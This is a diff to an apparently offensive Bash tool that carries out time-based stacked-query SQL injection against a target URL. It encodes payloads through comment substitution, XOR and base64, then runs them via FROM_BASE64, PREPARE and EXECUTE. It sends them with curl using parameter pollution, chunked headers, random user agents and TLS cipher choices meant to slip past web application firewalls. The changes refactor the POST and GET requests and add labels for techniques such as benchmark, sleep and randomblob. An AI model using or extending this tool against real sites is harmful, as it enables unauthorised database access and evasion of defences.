@@ -51,7 +51,7 @@
           local t4=$(space2comment_engine "$t2")
           local hex_xor=$(xor_engine "$t4")
           local b64_payload=$(base64_engine "$hex_xor")
-          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
+                    defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
 
           local waf_args=$(braindamage)
           local clean_target_url="${target_url%%\?*}"
@@ -80,20 +80,20 @@
           echo -e "$output_text"
 
           if [ "$REQ_METHOD" = "POST" ]; then
-            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-              curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+            local post_data="${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}"
+            curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+              -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
               -w "%{time_total}|%{http_code}" \
               "${target_url}${default_path}")
           else
-            curl_output=$(curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+            curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null \
               -w "%{time_total}|%{http_code}" \
               "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
           fi  
-
+               
           local stopwatch
           local http_status
           stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
@@ -171,7 +171,7 @@
             local t4=$(space2comment_engine "$t2")
             local hex_xor=$(xor_engine "$t4")
             local b64_payload=$(base64_engine "$hex_xor")
-            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"            
+                      defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
 
           local waf_args=$(braindamage)
           local clean_target_url="${target_url%%\?*}"
@@ -182,22 +182,37 @@
           else
             active_payload="$defiance_tamper_path"
           fi
-          local current_method="${REQ_METHOD:-POST}"                    
+          local current_method="${REQ_METHOD:-POST}"
+
+          if [[ "$payloadsi" = "true" ]]; then
+            output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
+          else
+            local technique_name="Generic Time-Based"
+            case "${raw_payload}" in
+              *"benchmark"*) technique_name="Stacked QueriesTime-Based (Heavy Benchmark)" ;;
+              *"randomblob"*) technique_name="Stacked Queries Time-Based (CPU-Exhaustion Blob)" ;;
+              *"extractvalue"*|*"updatesxml"*) technique_name="Stacked Queries Time-Based (XML Function Nested)" ;;
+              *"json_keys"*) technique_name="Stacked Queries Time-Based (JSON Object Nested)" ;;
+              *"sleep"*) technique_name="Stacked Queries Time-Based (Sub-Query Sleep)" ;;
+            esac
+            output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
+          fi
+          echo -e "$output_text"
 
           if [ "$REQ_METHOD" = "POST" ]; then
-            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-              curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+            local post_data="${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}"
+            curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+              -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
               -w "%{time_total}|%{http_code}" \
               "${target_url}${default_path}")
           else
-            curl_output=$(curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+            curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null \
               -w "%{time_total}|%{http_code}" \
               "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
-          fi                      
+          fi                
 
             local stopwatch
             local http_status
